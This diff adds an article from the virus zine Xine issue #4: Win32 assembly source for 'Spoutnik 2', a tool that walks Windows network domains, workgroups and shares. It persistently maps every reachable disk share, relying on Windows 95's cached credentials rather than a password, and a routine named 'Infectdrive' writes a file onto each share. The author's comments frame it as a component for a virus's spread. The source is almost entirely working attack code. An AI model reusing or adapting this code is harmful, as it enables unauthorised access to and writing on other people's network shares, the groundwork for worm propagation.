@@ -1,0 +1,431 @@
+   ;                                        /-----------------------------\
+   ;                                        | Xine - issue #4 - Phile 302 |
+   ;                                        \-----------------------------/
+
+
+   ;
+   ; This scanner was build on this principe(ikx)
+   ;
+   ;       if domain-server-generic found then scan again
+   ;         if connectable disk found then mount it
+   ;
+   ; This small application connect every sharable ressource on the network,
+   ; despite of no password, windows seems to connect anyway the ressource.
+   ; This was not previewved initially. Windows himself find and take
+   ; the password from the cache ?
+   ; Yeah, it's a win95 backD00r, it make things more simple but it hide
+   ; password to the user himself, even the virus don't know the password
+   ;
+   ; This program show how to connect a drive (ikx)
+   ; This program have also a fixed memory for scanning each type, then it
+   ; can't perform a 100% true full tree, he will be limited somewhere...
+   ;
+   ; Spoutnik 3 will fix this problem
+   ;
+   ; This part of code was coded under windows95, tested on windows98
+   ; KRRRASHED on windows NT
+   ; So NT users, don't panic and reformat your drive, install windows95 and
+   ; after you will be able to use that program
+   ; Else , you can debug this program and send me the working version for NT
+   ;
+   ; I will not do it myself, I'm in time deficit you know....
+   ;
+   ; Greetz(×kx):  Frederrico <- the Belgian Beer Killer! ;)
+   ;       and some s0 UnD4RGRooND PO3pl3 th4t N0bodY kn0\X/
+   ;
+   ; hope you enjoy the Code
+   ;                                                       Ikx/Ikx(ikx1999)
+
+
+
+   .386
+   locals
+   .model flat
+
+   ;Define the needed external functions and constants here.
+
+   extrn           ExitProcess:PROC
+   extrn       MessageBoxA:Proc
+   extrn           WNetOpenEnumA:Proc
+   extrn           WNetCloseEnum:Proc
+   extrn       WNetEnumResourceA:Proc
+   extrn       WNetAddConnection2A:Proc
+   extrn       WNetCancelConnection2A:Proc
+   extrn       GetCommandLineA:Proc
+   extrn       MessageBoxA:Proc
+   extrn           HeapCreate:Proc
+   extrn           HeapAlloc:Proc
+   extrn           HeapDestroy:Proc
+   extrn       GetLastError:Proc
+   extrn       CreateFileA:Proc
+   extrn       WriteFile:Proc
+   extrn       _lclose:Proc
+
+   .data                                   ;the data area
+
+   Tempdrive:  db 'Z'+1,':'            ; but I will
+   tmpflag:    db 0
+   Tempfile:   db 'create.txt',0
+   iobytes:    dd 0
+
+   Handle:     dd  0
+   MemPointer: dd  0
+   MemHandle:  dd  0
+   MemPointer2:    dd  0
+   MemHandle2: dd  0
+   MemPointer3:    dd  0
+   MemHandle3: dd  0
+   MemPointer4:    dd  0
+   MemHandle4: dd  0
+
+
+   Password:   dd  20 dup (0)      ; hahaha I removed my password
+           db  800 dup (?)
+
+   .code                                   ; executable code starts here
+
+   HOST:
+
+   Starthere:
+
+           call    GetCommandLineA               ; look if any password entered
+
+       mov esi,eax
+   dothattozero:
+       inc esi
+           cmp     byte ptr [esi],20h              ; if space then so
+       je  thengother
+
+           cmp     byte ptr [esi],0                ; if nothing then set default
+       jne dothattozero
+       jmp dothatanyway
+
+   thengother:
+           mov     edi,offset Password             ; set password
+
+   gototheree:
+       inc esi
+           inc     edi
+           mov     al,byte ptr [esi]               ; get password characters
+       cmp al,0
+           je      dothatanyway                    ; end of paswword ?
+
+       mov byte ptr [edi],al
+           jmp     gototheree                      ; loop
+
+
+   dothatanyway:
+
+           mov     edx,offset MemPointer           ; alloc first memory for
+           mov     ebx,0FFFFh/2                    ; scanning
+       Call    Alloc
+
+       mov     edx,offset MemPointer2
+       mov ebx,0FFFFh/2
+           Call    Alloc                           ; memory 2
+
+           mov     edx,offset MemPointer3          ; memory 3
+       mov ebx,0FFFFh/2
+       Call    Alloc
+
+           mov     edx,offset MemPointer4          ; memory4
+       mov ebx,0FFFFh/2
+       Call    Alloc
+
+       dec eax
+           jc      Fini                           ; can't allocate, then finish!
+       inc     eax
+
+           mov     eax,0
+           mov     ebx,dword ptr [MemPointer]
+           call    Globalconnection                ; open the connection to
+                                                   ; the global networks
+           jc      Fini1                           ; in order to scan ressources
+
+   Nextone:
+
+       mov     eax,dword ptr [MemPointer]
+           Call    EnumResource                    ; get all 1st entries
+           jc      Fini                            ; generally the Domain
+                                                   ; or Generic
+       mov     esi,dword ptr [MemPointer]
+           call    scanall                         ; then we scan sub entries
+       jmp Nextone
+
+   scanall:
+           pushad                                  ; we scan
+           mov     ecx,dword ptr [esi+04]          ; look to the Netressource
+           lea     edi,[esi+0Ch]                   ; structure, looking for
+                                                   ; types...
+   scaneach:
+
+       push    edi
+       push    ecx
+           call    scaneachtype                    ; Now we do the ring scanner
+       pop ecx
+       pop edi
+       add edi,32
+
+       loop    scaneach
+           popad                                   ; Ikx
+       ret
+
+   scaneachtype:
+
+           cmp     dword ptr [edi+8],2             ; Scan for sharing ressource
+           je      Scanshare                       ; not necessary disk but
+                                                   ; shared directories...
+       cmp dword ptr [edi+8],1
+           je      Scangroup                       ; scan the group
+       cmp dword ptr [edi+8],3
+       je  Infectdrive
+       cmp dword ptr [edi+8],6
+           je      Scandomain                      ; scan the domain
+       ret
+
+   Scandomain:
+
+       mov ebx,dword ptr [MemPointer2]
+       mov eax,edi
+           call    Globalconnection                ;ask for connection...
+       jc  scandomainfin
+
+
+   scandomain2:
+
+       mov eax,dword ptr [MemPointer2]
+           Call    EnumResource                    ; ask for entries
+       jc  scandomainfin
+
+       mov esi,dword ptr [MemPointer2]
+           call    scanall                         ; scan subentries
+       jmp scandomain2
+
+   scandomainfin:
+
+       mov eax,dword ptr [MemPointer2]
+       call    closeenum           ; close the ennumeration
+       ret
+
+   Scangroup:
+
+       mov ebx,dword ptr [MemPointer3]
+       mov eax,edi
+           call    Globalconnection                ; scan the group
+       jc  scangroupfin
+
+   scangroup2:
+
+       mov     eax,dword ptr [MemPointer3]
+       Call    EnumResource            ; ask for entries
+       jc  scangroupfin
+
+       mov     esi,dword ptr [MemPointer3]
+           call    scanall                         ; scan sub entries
+
+       jmp scangroup2
+
+   scangroupfin:
+
+       mov eax,dword ptr [MemPointer3]
+       call    closeenum
+       ret
+
+   Scanshare:
+
+       cmp dword ptr [edi+20],0
+       je  Nextone         ; test if this is a remote things
+
+       mov ebx,dword ptr [MemPointer4]
+       mov eax,edi
+           call    Globalconnection                ; scan for sub connections
+           jc      scanusefini                     ; in machine
+
+   scanuse2:
+
+       mov     eax,dword ptr [MemPointer4]
+           Call    EnumResource                    ; ask for entries
+       jc  scanusefini
+
+       mov esi,dword ptr [MemPointer4]
+       call    scanall
+
+       jmp scanuse2
+
+   scanusefini:
+
+       mov     eax,dword ptr [MemPointer4]
+       call    closeenum           ; close enumeration
+       ret
+
+   Infectdrive:
+
+       mov dword ptr [edi+16],offset Tempdrive ; we have to set
+                           ; the Local name as a drive
+                           ; letter 'Ex:F: etc etc'
+                           ; here I choose to start
+                           ; from Z to go to A
+       dec byte ptr [Tempdrive]
+
+           push    0FF000000h          ; persistant
+       push    0               ; default user...
+       push    offset Password         ; seems not really need
+       push    edi             ; the NEtressource table
+       Call    WNetAddConnection2A     ; Now we connect
+       cmp eax,0
+       jne Cantconnect
+
+       push    large 0
+       push    large 80h
+       push    large 1             ; create allways new
+       push    large 0
+       push    large 0
+       push    80000000h or 40000000h      ; create the file in read
+       push    offset Tempdrive
+       mov byte ptr [tmpflag],'\'      ; this just for F:\blabla
+       Call    CreateFileA         ; create a file
+       dec byte ptr [Tempdrive]
+       mov byte ptr [tmpflag],0
+       inc eax
+       jz  Disconnect
+
+       dec     eax
+       push    eax
+
+       push    0
+       push    offset iobytes
+       push    8
+       push    offset Tempfile
+       push    eax
+       Call    WriteFile           ; write 8 byte on the file
+                           ; close it
+       Call    _lclose
+
+   Disconnect:
+
+   ;   push    0               ; NORMALLY WE HAVE TO CANCEL
+   ;   push    1               ; THE CONNECTION WHEN FINISH
+   ;   push    offset Tempdrive
+   ;   Call    WNetCancelConnection2A
+
+   Cantconnect:
+       inc     byte ptr [Tempdrive]
+
+       ret
+
+   EnumResource:
+
+       lea     ecx,[eax+8]         ; heap organisation...
+
+       mov     edx,32000
+       mov dword ptr [ecx],edx     ;
+       push    ecx             ; buffer size
+
+       lea ecx,[eax+12]
+       push    ecx             ; buffer = heap +12
+
+       mov     dword ptr [eax+4],-1
+       lea ecx,[eax+4]
+       push    ecx             ; number of entries = 0FFFFFFFh
+
+       push    dword ptr [eax]         ; handle
+       Call    WNetEnumResourceA
+       add eax,-1
+       ret
+
+   closeenum:
+
+       push    dword ptr [eax]
+       Call    WNetCloseEnum
+       ret
+
+   Globalconnection:
+
+           mov     ecx,2
+           jmp     Netconnection
+
+   Contextconnection:
+
+           mov     ecx,5
+
+   Netconnection:
+
+           push    ebx
+           push    eax
+           push    large 3             ; fwdusage
+           push    large 1             ; fwdtype , get only disks
+           push    ecx                 ; fwdscope
+       call    WNetOpenEnumA
+           add     eax,-1
+           ret
+
+   Alloc:                      ; Hacked from Explorer.exe
+                           ; given with window95 Chicago
+                           ; ver 4.00.950 line#0040D0DE
+                           ; **normally** works with
+       push    edx             ; NT but allways...
+       push    edx
+
+           push    0
+           push    ebx
+       push    0
+           Call    HeapCreate
+
+       pop edx
+           mov     dword ptr [edx],eax
+
+           cmp     eax,0
+           jz      AllocBad
+
+       dec ebx
+       push    ebx
+       push    8h
+           push    eax
+           Call    HeapAlloc
+
+       pop edx
+       mov dword ptr [edx+4],eax
+
+           ret
+
+   AllocBad:       sub eax,-1
+                   ret
+
+   Deloc:
+
+           push    dword ptr [MemHandle]
+           Call    HeapDestroy
+           push    dword ptr [MemHandle2]
+           Call    HeapDestroy
+
+           ret
+
+
+   Fini:
+
+       mov eax,dword ptr [MemPointer]
+       call    closeenum           ; finish global connection
+
+   Fini1:
+       call    Deloc
+       cmp byte ptr [Tempdrive],'Z'+1
+       jne thenskipbox
+
+       push    0               ; put the small box if nutin
+       push    offset BoxMsg2          ; connected
+       push    offset BoxMsg
+       push    0
+       call    MessageBoxA
+
+   thenskipbox:
+       push    LARGE -1
+           call    ExitProcess             ;this simply terminates the program
+
+   BoxMsg2:        db  '        Spoutnik_2^ikx II{IkX}',0
+   BoxMsg:         db  '        No ressource connected!',10,13,10,13
+               db  ' Correct syntax: spoutnik (password)',10,13
+               db  '     Ex: spoutnik jennajameson',10,13,10,13
+               db  'Nota bene:password is not necesseary',10,13
+
+   ends
+   end HOST
